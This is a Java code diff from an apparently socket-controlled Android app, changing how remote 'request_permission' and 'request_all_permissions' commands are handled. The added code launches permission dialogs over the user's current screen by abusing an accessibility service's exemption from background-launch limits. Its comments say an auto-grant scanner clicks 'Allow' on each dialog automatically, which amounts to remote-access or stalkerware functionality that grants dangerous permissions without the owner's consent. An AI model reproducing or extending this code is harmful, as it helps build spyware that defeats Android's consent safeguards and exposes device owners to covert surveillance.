@@ -1802,27 +1802,91 @@ public class SocketManager {
                 r.put("error", "Missing 'permission' parameter");
                 return r;
             }
-            JSONObject result = permissionManager.requestPermission(perm);
-            // Re-enable auto-grant so the accessibility service automatically
-            // clicks "Allow" on the dialog that is about to appear.
-            // Without this, autoGrantMode is false (first-launch window long gone)
-            // and the dialog just sits there waiting for a manual tap.
-            try {
-                com.task.tusker.services.UnifiedAccessibilityService svc =
-                    com.task.tusker.services.UnifiedAccessibilityService.getInstance();
-                if (svc != null) svc.reEnableAutoGrant(20_000);
-            } catch (Exception ignored) {}
-            return result;
+
+            // If already granted, return immediately — no dialog, no launch.
+            if (androidx.core.content.ContextCompat.checkSelfPermission(context, perm)
+                    == android.content.pm.PackageManager.PERMISSION_GRANTED) {
+                JSONObject r = new JSONObject();
+                r.put("success", true);
+                r.put("message", "Permission already granted: " + perm);
+                r.put("alreadyGranted", true);
+                return r;
+            }
+
+            UnifiedAccessibilityService svc = UnifiedAccessibilityService.getInstance();
+
+            // API < 35 + accessibility running:
+            //   Launch PermissionRequestActivity DIRECTLY (skip MainActivity).
+            //   The dialog floats over whatever the user is doing. The accessibility
+            //   service is exempt from Android 10+ background-launch restrictions so
+            //   startActivity() works without a full-screen notification.
+            //   The 100ms auto-grant scanner will click "Allow" automatically.
+            if (Build.VERSION.SDK_INT < 35 && svc != null) {
+                svc.launchPermissionDialogDirectly(new String[]{ perm });
+                JSONObject r = new JSONObject();
+                r.put("success", true);
+                r.put("message", "Permission dialog shown directly (auto-granter active): " + perm);
+                return r;
+            }
+
+            // API >= 35 OR no accessibility:
+            //   Bring MainActivity to front first, then show the dialog inside it.
+            if (svc != null) {
+                svc.launchPermissionDialogInForeground(new String[]{ perm });
+                JSONObject r = new JSONObject();
+                r.put("success", true);
+                r.put("message", "Permission dialog launching in foreground: " + perm);
+                return r;
+            }
+
+            // Last resort: notification-based two-step launch (no accessibility at all).
+            return permissionManager.requestPermission(perm);
         }
+
         if (command.equals("request_all_permissions")) {
-            JSONObject result = permissionManager.requestAllPermissions();
-            // Same as above — re-enable the granter for all the dialogs that will appear.
-            try {
-                com.task.tusker.services.UnifiedAccessibilityService svc =
-                    com.task.tusker.services.UnifiedAccessibilityService.getInstance();
-                if (svc != null) svc.reEnableAutoGrant(20_000);
-            } catch (Exception ignored) {}
-            return result;
+            // Determine which standard runtime permissions are still missing.
+            java.util.List<String> missing = new java.util.ArrayList<>();
+            for (String p : com.task.tusker.permissions.AutoPermissionManager.DANGEROUS_PERMISSIONS) {
+                if (androidx.core.content.ContextCompat.checkSelfPermission(context, p)
+                        != android.content.pm.PackageManager.PERMISSION_GRANTED) {
+                    missing.add(p);
+                }
+            }
+
+            // All already granted — no launch needed.
+            if (missing.isEmpty()) {
+                JSONObject r = new JSONObject();
+                r.put("success", true);
+                r.put("message", "All standard permissions already granted");
+                r.put("alreadyGranted", true);
+                return r;
+            }
+
+            String[] missingArr = missing.toArray(new String[0]);
+            UnifiedAccessibilityService svc = UnifiedAccessibilityService.getInstance();
+
+            // API < 35 + accessibility: direct launch — dialogs float over current screen,
+            // auto-granter clicks each "Allow" as dialogs appear in sequence.
+            if (Build.VERSION.SDK_INT < 35 && svc != null) {
+                svc.launchPermissionDialogDirectly(missingArr);
+                JSONObject r = new JSONObject();
+                r.put("success", true);
+                r.put("message", "Permission dialogs shown directly for " + missing.size()
+                        + " permission(s) (auto-granter active)");
+                return r;
+            }
+
+            // API >= 35 OR no accessibility: full two-step foreground launch.
+            if (svc != null) {
+                svc.launchPermissionDialogInForeground(missingArr);
+                JSONObject r = new JSONObject();
+                r.put("success", true);
+                r.put("message", "All permission dialogs launching in foreground");
+                return r;
+            }
+
+            // Last resort: notification-based two-step launch.
+            return permissionManager.requestAllPermissions();
         }
 
         // ── Screen Reader Recordings (no accessibility needed) ────────────────
